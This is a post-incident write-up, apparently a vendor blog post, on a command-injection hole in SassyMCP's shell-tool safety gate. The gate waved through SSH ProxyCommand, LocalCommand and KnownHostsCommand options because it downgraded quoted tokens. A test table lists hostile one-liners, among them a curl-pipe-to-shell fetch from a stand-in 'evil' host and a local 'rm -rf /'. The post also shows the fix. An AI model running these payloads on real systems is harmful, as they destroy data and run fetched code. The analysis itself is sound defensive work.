My security gate's safest verdict was its worst input

Sassy Consulting LLC · Shane Smith · Published 2026-11-09 · Incident occurred 2026-09-20

Summary. A security researcher emailed me reporting a critical remote code execution vulnerability in SassyMCP. The report claimed a bypass of our harden_ssh filter via SSH ProxyCommand parameter injection. The researcher was right that the vulnerability was real, but wrong about the mechanism. harden_ssh was never a filter — it was a two-line ergonomics helper to append -o BatchMode=yes. The actual vulnerability was one layer deeper: our command security gate downgraded dangerous tokens found inside quoted strings to "low" severity, treating them as harmless string literals. Because SSH options must be quoted, the exact heuristic designed to prevent false positives waved through arbitrary local shell execution.

The vulnerability report

In September 2026, an external researcher reached out via GitHub Issue #38 and follow-up email. The claim was stark: sassy_shell allowed arbitrary command execution by bypassing the harden_ssh filter using SSH ProxyCommand parameter injection. Attached was a password-protected ZIP archive.

I did not open the archive. A password-protected ZIP from an unknown email address is the canonical method for bypassing automated AV scanners. More importantly, I did not need it. The description named the mechanism, and the mechanism was verifiable directly against my own source in two minutes. Testing from the conceptual model rather than running untrusted binary payloads is safer and forces an understanding of what the code actually does.

The red herring: harden_ssh

The report focused on a function named harden_ssh in hermes_node.py. Looking at the implementation immediately showed why the report's explanation was wrong:

def harden_ssh(cmd):
    """SassyMCP edge: sassy_shell wedges on interactive SSH. Force non-interactive."""
    if cmd.strip().lower().startswith("ssh ") and "batchmode" not in cmd.lower():
        return cmd.replace("ssh ", "ssh -o BatchMode=yes -o ConnectTimeout=5 ", 1)
    return cmd

This was never an input filter. It was an ergonomics shim written so that automated background tool calls would not hang indefinitely on an interactive password prompt. There was no security boundary here to bypass.

That realization made the situation worse, not better. If harden_ssh was not the guard, why did the command run? The failure had to reside in the shared validation layer that all shell execution tools rely on.

The real defect: Heuristic inverted by nested execution

To inspect what the gate was actually deciding, I tested eight variations against validate_command_tiered and detect_delete_intent:

Command InputBlocklist Clean?Tier VerdictDelete Detected?
ssh -o ProxyCommand="cmd /c calc.exe" user@hostTrue-False
ssh -oProxyCommand=calc.exe user@hostTrue-False
ssh -o BatchMode=yes -o ProxyCommand="powershell -c Remove-Item..."True-False
ssh -o PermitLocalCommand=yes -o LocalCommand="cmd /c whoami"True-False
ssh -o KnownHostsCommand="/tmp/pwn" user@hostTrue-False
scp -o ProxyCommand="curl http://evil/x|sh" a bTrue-False
ssh -F /tmp/evil_config user@hostTrue-False
ssh -o ProxyCommand="rm -rf /" user@hostFalselowFalse

Seven of the eight payloads returned completely clean verdicts. The eighth line — ssh -o ProxyCommand="rm -rf /" user@host — was the most dangerous, and the gate assigned it tier low.

In SassyMCP's execution gate, tier low logs blocklist_literal_allowed and falls through to execution. The worst payload in the entire test suite was the one the security gate had cleared with the highest confidence.

The mechanics of the bypass

Two distinct design assumptions interacted to produce a full local shell escape:

  1. Missing wrapper recursion. detect_delete_intent recursed into nested commands only if the wrapper command matched an explicit table: powershell, cmd, wsl, bash, sh, zsh. ssh was not in the table. The gate assumed ssh was a network client communicating with an external system.
  2. The quote-downgrade heuristic. validate_command_tiered searched for destructive commands like rm -rf, format, and dd. If a match occurred inside a quoted string, it downgraded the severity to low. The logic was clear: in echo "format the disk", the dangerous phrase is string data, not an executable instruction.

When applied to OpenSSH, that heuristic was fatal. SSH command-line options containing spaces must be wrapped in quotes. Furthermore, OpenSSH does not execute ProxyCommand, LocalCommand, or KnownHostsCommand on the remote target; it spawns them on the local machine via the local shell before establishing the TCP connection.

The remote host did not even need to exist or be reachable. ssh -o ProxyCommand="rm -rf /" nonexistent.invalid executed rm -rf / locally before any network packet was transmitted. The exact heuristic built to suppress false positives on string literals was what cleared arbitrary local execution.

Blast radius

Tracing the codebase revealed that this validation gate was not isolated to sassy_shell. Five tools used the identical validation pipeline:

  • sassy_shell
  • sassy_linux_exec
  • sassy_session_start
  • sassy_session_send
  • sassy_adb_shell

If I had patched harden_ssh where the vulnerability report pointed, none of the other four tools would have been protected, and sassy_shell would still have been vulnerable to variations without leading spaces.

The fix

The fix required intercepting SSH local-execution directives in sassymcp/modules/_security.py before the command reached the string-parsing and quote-downgrading blocklist:

ssh_hit, _ssh_label, ssh_detail = detect_ssh_exec_option(command)
if ssh_hit:
    return False, "high", (
        f"Command blocked (safety): {ssh_detail}. Use ProxyJump "
        "('ssh -J jumphost target') for jump hosts, or run this ssh "
        "invocation outside the MCP tool surface."
    )

The helper detect_ssh_exec_option inspects the unstripped raw command string, deliberately avoiding quote removal. It checks for SSH binaries accompanied by ProxyCommand, LocalCommand, PermitLocalCommand, or KnownHostsCommand. It also inspects configuration loading via -F or -o Include= to prevent redirecting to an untrusted local SSH config file outside ~/.ssh.

All eight test payloads were re-tested; each now evaluates to tier=high and execution is denied. Twenty-six unit tests were added to guarantee the boundary holds against varying whitespace, case formatting, and combined flags. The patch shipped in SassyMCP v1.15.2.

Lessons for agent systems

  • Inspect the next interpreter, not the outer command. Checking whether a string is enclosed in quotes answers whether the outer shell treats it as data. It says nothing about what the program receiving that string will do with it. Whenever an application accepts arguments that it hands to a sub-shell, the argument is code.
  • Security filters cannot rely on ergonomics wrappers. A function created to ensure smooth automation (such as forcing non-interactive flags) must never be treated as an authorization boundary.
  • Trace the shared gate. When a defect is discovered in one tool, trace every caller sharing the validation logic. One hole in a centralized validator is a hole in every exposed surface.
  • Verify claims against code, not reports. Reporters frequently identify real vulnerabilities while misidentifying the underlying mechanism. Fixing what the reporter described would have left the hole wide open.
